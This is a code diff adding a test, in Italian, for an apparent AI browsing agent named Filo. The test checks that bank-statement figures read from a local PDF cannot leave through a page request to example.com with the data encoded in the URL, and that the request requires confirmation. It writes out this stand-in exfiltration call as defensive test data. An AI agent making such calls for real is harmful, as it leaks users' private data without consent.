@@ -78,3 +78,23 @@ test('quello che Filo ha letto da una scheda non esce senza conferma', async ({ 
   expect(fuori.needsConfirm).toBe(2);
   expect(await contattati(app)).toEqual([]);
 });
+
+test('e nemmeno quello che Filo ha letto da un documento sul disco', async ({ app, openTab }) => {
+  test.setTimeout(90_000);
+  await openTab('filo://newtab/');
+  const CHAT = 'filo://dashboard/dashboard.html';
+  const PERCORSO = 'tests/fixtures/documenti/documento-con-testo.pdf';
+  const DENTRO = 'Estratto conto Filo Giacenza media: 1.234,56 euro Saldo finale: 987,65 euro';
+
+  const doc = await azioneDa(app, { type: 'LEGGI_DOCUMENTO', percorso: PERCORSO }, CHAT);
+  expect(String(doc.output.text || '')).toContain('1.234,56');
+
+  await intercettaRete(app);
+  const fuori = await azioneDa(
+    app,
+    { type: 'LEGGI_PAGINA', url: `https://example.com/raccolta?d=${encodeURIComponent(DENTRO)}` },
+    CHAT,
+  );
+  expect(fuori.needsConfirm).toBe(2);
+  expect(await contattati(app)).toEqual([]);
+});
